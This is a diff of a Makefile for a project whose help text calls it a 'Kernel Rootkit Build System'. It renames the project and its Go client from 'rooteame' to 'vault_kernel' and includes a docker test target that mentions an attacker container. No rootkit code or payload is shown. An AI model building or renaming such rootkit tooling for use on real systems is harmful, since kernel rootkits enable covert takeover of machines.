@@ -8,8 +8,8 @@ kernel:
 
 # Build Go client
 client:
-	cd client/go && go build -ldflags="-s -w" -o rooteame ./cmd/rooteame/
-	@echo "[+] Go client: client/go/rooteame"
+	cd client/go && go build -ldflags="-s -w" -o vault_kernel ./cmd/vault_kernel/
+	@echo "[+] Go client: client/go/vault_kernel"
 
 # Run Go unit tests
 test-go:
@@ -37,18 +37,18 @@ docker-down:
 
 docker-test: docker-build docker-up
 	@echo "[*] Environment ready for manual testing."
-	@echo "    docker exec -it rooteame-attacker bash"
+	@echo "    docker exec -it vault_kernel-attacker bash"
 
 # Clean
 clean:
 	$(MAKE) -C src clean
-	rm -f client/go/rooteame
+	rm -f client/go/vault_kernel
 	rm -rf docker/out/*
 	@echo "[+] Cleaned"
 
 # Help
 help:
-	@echo "rooteame — Kernel Rootkit Build System"
+	@echo "vault_kernel — Kernel Rootkit Build System"
 	@echo ""
 	@echo "Targets:"
 	@echo "  kernel           Build kernel module (requires GCC + kernel headers)"
